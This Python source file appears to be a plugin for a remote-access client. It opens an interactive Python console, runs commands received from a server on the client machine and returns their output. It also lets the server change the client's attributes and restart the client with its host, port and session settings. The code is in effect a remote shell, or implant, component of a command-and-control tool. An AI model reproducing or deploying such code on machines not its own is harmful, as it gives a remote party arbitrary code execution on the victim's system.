import shlex
import sys
import socket
import subprocess
from os.path import realpath
from code import InteractiveConsole


class FileCacher:
    "Cache the stdout text so we can analyze it before returning it"
    def __init__(self):
        self.out = []
        self.reset()

    def reset(self):
        self.out = []

    def write(self, line):
        self.out.append(line)

    def flush(self):
        output = ''.join(self.out)
        self.reset()
        return output


class Shell(InteractiveConsole):
    "Wrapper around Python that can filter input/output to the shell"
    def __init__(self, locals=None, filename='<console>'):
        self.stdout = sys.stdout
        self.cache = FileCacher()
        super(Shell, self).__init__(locals=locals, filename=filename)
        return

    def get_output(self):
        sys.stdout = self.cache

    def return_output(self):
        sys.stdout = self.stdout

    def push(self, line):
        self.get_output()
        # you can filter input here by doing something like
        # line = filter(line)
        InteractiveConsole.push(self, line)
        self.return_output()
        output = self.cache.flush().strip()
        # you can filter the output here by doing something like
        # output = filter(output)
        # or do something else with it
        print(output)
        return output


class Plugin(object):
    version = 'v1.0'
    invocation = 'client '
    enabled = True

    def run(self, client, data):
        args = shlex.split(data)

        if not args:
            client.server_print('< The `client` command requires an argument. >')

        if args[0] == '-i':
            client.send_data('')
            console = Shell(locals={'client': client, 'data': data})
            while True:
                command = client.receive_data()
                if command == 'exit()':
                    client.server_print('< InteractiveConsole shutting down. >')
                    break
                output = console.push(command)
                client.send_data(output)
            return

        # Set an attribute on the Client instance.
        if args[0] == '-s':
            try:
                key, value = args[1], args[2]
            except IndexError:
                client.server_print('< `-s`(setattr) requires a `key` and `value`. >')
                return
            try:
                setattr(client, key, value)
                client.server_print('< Client attribute "{}" set to "{}". >'.format(key, value))
            except AttributeError:
                client.server_print('< Client has no attribute, "{}". >'.format(key))

            return

        # Get an attribute from the Client instance.
        if args[0] == '-g':
            try:
                key = args[1]
            except IndexError:
                client.server_print('< `-g`(getattr) requires a `key`. >')
                return

            try:
                attr = getattr(client, key)
                client.server_print('< {} = {} >'.format(key, attr))
            except AttributeError:
                client.server_print('< Client has no attribute, "{}" >'.format(key))
            return

        if args[0] == '-debug':
            return

        # Restart the `client.py` script.
        if args[0] == '-r':
            client.send_data('')
            Plugin.reboot_client(client)
            sys.exit()

    @staticmethod
    def reboot_client(client):
        """
        Reboot the client.

        :return:
        """

        try:
            client.sock.close()
        except socket.error:
            pass

        rc = [
            sys.executable,
            'port={}'.format(client.port),
            'host={}'.format(client.host),
            'recv_size={}'.format(client.recv_size),
            'session_id={}'.format(client.session_id),
            'echo={}'.format(client.echo)
        ]

        # Try to use subprocess to reboot.  If there is a permissions error,
        # use execv to try to achieve the same thing.
        try:
            popen_rc = [sys.executable] + list((sys.argv[0],)) + rc[1:]
            p = subprocess.Popen(popen_rc)
            p.communicate()
        except PermissionError:
            from os import execv
            print('Using execv...')
            rc.pop(0)
            rc.insert(0, realpath(__file__))
            rc.insert(0, '')
            execv(sys.executable, rc)

        sys.exit()

